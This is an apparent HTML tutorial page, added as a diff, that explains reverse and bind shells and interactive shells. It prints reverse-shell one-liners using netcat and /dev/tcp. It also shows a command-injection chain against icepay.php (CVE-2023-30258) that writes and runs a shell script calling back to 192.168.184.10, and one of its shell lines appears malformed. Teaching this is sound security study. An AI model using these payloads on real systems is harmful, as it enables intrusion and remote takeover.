@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>articles</title>
+</head>
+<body>
+    <style>
+        body {
+            background-color: black;
+            text-align: center;
+            color: white;
+            font-family: 'Fira Mono', monospace;
+        }
+
+        .image {
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }  
+
+        a {
+            color: white;
+            text-decoration: none;
+        }
+
+        a:hover {
+            color: #29c107; /* Accent color on hover */
+        }
+
+        hr {
+            border: 0;
+            height: 1px;
+            background: #444;
+            margin: 20px 0;
+        }
+
+        footer {
+            margin-top: 40px;
+            padding: 10px 0;
+            border-top: 1px solid #444;
+            font-size: 0.9em;
+            color: #888;
+        }
+
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        li {
+            margin: 10px 0;
+        }
+
+        h1 {
+            color: #29c107; /* Accent color for headings */
+        }
+
+        h3 {
+            color: white;
+            font-family: monospace;
+        }
+
+        p {
+            max-width: 1200px;
+            margin: 0 auto 20px auto;
+            line-height: 1.6;
+            text-align: justify;
+        }
+        code {
+            color: red;
+            font-family: monospace;
+            font-size: 20px;
+            text-decoration: solid;
+        }
+        pre {
+            text-align: start;
+            padding-left: 33%;
+        }
+
+    </style>
+
+    <div class='image'>
+        <img src="assets/lain.jpg" alt="Write-ups" style="width:300px;height:300px;">
+    </div>
+    <hr>
+    <h1>Reversing and Privesc stuffs</h1>
+
+    <h2>Attack types</h2>
+    <p>Reverse shells are an attack technique in which the attacker forces the target to execute malicious code that initiates a connection back to the attacker’s machine. 
+        On the attacker’s side, a program such as netcat, socat, or another socket-based application listens for and accepts this incoming connection, allowing remote command execution.
+    </p>
+
+    <p>
+    Bind shells work differently. In this attack technique, the attacker causes the target system to open a network port and run a service that listens for incoming connections. 
+    Once an attacker successfully connects to this port, they can send commands directly to the target system.
+    <br>
+    <br>
+    <strong>Interactive vs Non-Interactives</strong>
+    <br>
+    <u>Interactive shells</u> allows you to execute "sophisticated" programs which
+    demands and allow you to interact with programs after executing them.
+    A good example is the text editor nano opened in a local shell.
+    <br>
+    <br>
+    <u>Non-Interactive shells</u> (this is what you will receive when you reverse
+    a connection) are limited shells, it means that they will not be able
+    to run complex programs without crashing the whole thing. It happens
+    because when you reverse a connection, in truth, you are interacting 
+    with a process running inside of a terminal.
+    
+    </p>
+
+    <pre>
+
+
+                                                                      <strong><code>nc -lvnp 443</code></strong>
+                                                                         ______________
+                                                            >       >   ||            ||                            
+                                             +======+ >                 ||    Your    ||                             
+                                             |  sh  |                   ||   Machine  ||                                                                     
+                                             +======+                   ||            ||    
+                                            >                           ||____________||
+     <strong><code>nc <HACKES'S IP> <PORT> -e /bin/bash</code></strong>                                           |______________| 
+                                        >                                \\############\\
+            TARGET SERVER         >                                       \\############\\
+                            >                                              \      ____    \   
+⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀                                        \_____\___\____\  
+⠀⠀⢸⡿⠿⠿⢿⣿⡿⠿⠿⢿⣿⠿⠿⠿⣿⡟⢻⣿⣿⣿⣿⡟⠛⢿⣿⡇⠀⠀                                                                          
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣷⣶⣿⣿⡇⠀⠀ 
+⠀⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⠿⠿⢿⣿⡿⠿⠿⣿⣿⡿⠿⠿⣿⡟⢿⣿⣿⣿⣿⡿⠻⣿⣿⡇⠀⠀
+⠀⠀⢸⣷⣶⣶⣾⣿⣷⣶⣶⣾⣿⣶⣶⣶⣿⣧⣼⣿⣿⣿⣿⣷⣤⣾⣿⡇⠀⠀
+⠀⠀⠈⠉⠉⠉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⠉⠉⠉⠁⠀⠀
+⠀⠀⠀⠀⠀⠀⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠀⠀⠀⠀⠀⠀
+⠀⠀⢰⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⡶⣶⣶⣶⣶⣶⣶⢶⣶⣶⡆⠀⠀
+⠀⠀⢸⣯⣤⣤⣼⣿⣧⣤⣤⣽⣿⣤⣤⣤⣿⣇⣸⣿⣿⣿⣿⣧⣀⣽⣿⡇⠀⠀
+⠀⠀⠘⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠃⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢰⣶⣶⣶⣶⣶⣶⣶⡶⠀⣰⣶⣶⣶⣶⣶⣶⣆⠀⢶⣶⣶⣶⣶⣶⣶⣶⡆⠀
+⠀⠈⠉⠉⠉⠉⠉⠉⠉⠁⠈⠉⠉⠉⠉⠉⠉⠉⠉⠁⠈⠉⠉⠉⠉⠉⠉⠉⠁⠀        
+
+    </pre>
+
+    <h2>Reversing techniques</h2>
+    <p>I will list and explain here some reversing techniques and which I think that are really useful. <br>
+    <br>
+    <strong>Bash (raw)</strong><br>
+    <code>sh -i >& /dev/tcp/{YOUR_IP}/{YOUR_PORT} 0>&1</code><br>
+    This is way to reverse a connection. This case is more efficient in vulnerabilities which allows you to write
+    and execute code (RCE). To examplify the how useful it is, we can use the vulnerabily CVE-2023-30258, there is parameter in the URL which
+    allows you to execute commands. With it, we can do something like: <br>
+    <br>
+    <code>
+    icepay.php?democ=testfile; echo "#!/bin/bash" > /tmp/a.sh <br>
+    icepay.php?democ=testfile; echo "sh -i /dev/tcp/192.168.184.10/1337 0>&1" >> /tmp/a.sh <br>
+    icepay.php?democ=testfile; chmod 755 /tmp/a.sh <br>
+    icepay.php?democ=testfile; sh /tmp/a.sh
+    </code> <br> 
+
+    Let's break this code: <br>
+    <br>
+    <strong>sh -i</strong> invoke the shell in interactive mode, which allows type commands and to see the output. <br>
+    <br>
+    <strong>/dev/tcp/{your_ip}/{your_port}</strong> It is a special feature on shell, when you type it, the shell tries to open a file (because / is a redirector operator)
+    however the kernel takes this as a request to open a socket with the IP and PORT specified. There is a more detailed explanation 
+    right <a href="https://stackoverflow.com/questions/76899269/can-someone-explain-how-does-this-command-works-bash-i-dev-tcp-ip-port">here.</a> <br>
+    <br>
+    <strong>>&</strong> This part does two redirections: > redirects the stdout (standard output) and the & redirects stdout and stderr. This is necessary to see the outputs
+    through the TCP connection.
+    <br>
+    <strong>0>&1</strong> This one redirects the stdin 0 (keyboard input) to the stdout (screen output). It means: dommands typed remotely are executed locally (in this case, locally
+    for us means the target POV).
+
+    </p>
+
+    <h1>DON'T GO YET!!!</h1>
+    <h3>This page is under constant update.</h3>
+    <p>
+    I intend to keep updating this page with more study content stuff.
+    I really like to teach people who really want to learn, so for me it is a pleasure to help.
+    </p>
+</body>
+
+</html>
+
+
